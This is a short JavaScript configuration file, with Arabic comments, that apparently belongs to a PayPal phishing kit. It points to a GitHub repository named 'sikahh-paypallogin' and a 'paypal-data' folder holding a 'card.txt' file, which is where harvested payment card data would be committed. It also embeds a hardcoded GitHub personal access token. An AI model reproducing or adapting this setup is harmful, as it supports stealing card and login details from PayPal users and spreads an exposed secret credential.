// تكوين GitHub لحفظ البيانات
// يجب تحديث هذه المعلومات حسب مستودعك

const GITHUB_CONFIG = {
    // معلومات المستودع - يجب تحديثها بمعلوماتك الحقيقية
    owner: 'sikahh',                         // اسم المستخدم في GitHub
    repo: 'sikahh-paypallogin',              // اسم المستودع الصحيح
    branch: 'data-storage',                  // فرع منفصل لحفظ البيانات
    
    // Personal Access Token - يجب تحديثه بالـ Token الحقيقي
    // يجب إنشاؤه من: GitHub → Settings → Developer settings → Personal access tokens
    token: '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',
    
    // إعدادات الملفات
    dataFolder: 'paypal-data',               // مجلد حفظ البيانات
    fileName: 'card.txt',                    // اسم الملف الثابت
    
    // معلومات الـ commit
    committer: {
        name: 'PayPal Data System',
        email: 'system@paypal-data.com'
    }
};

// تصدير التكوين
if (typeof module !== 'undefined' && module.exports) {
    module.exports = GITHUB_CONFIG;
} else if (typeof window !== 'undefined') {
    window.GITHUB_CONFIG = GITHUB_CONFIG;
}
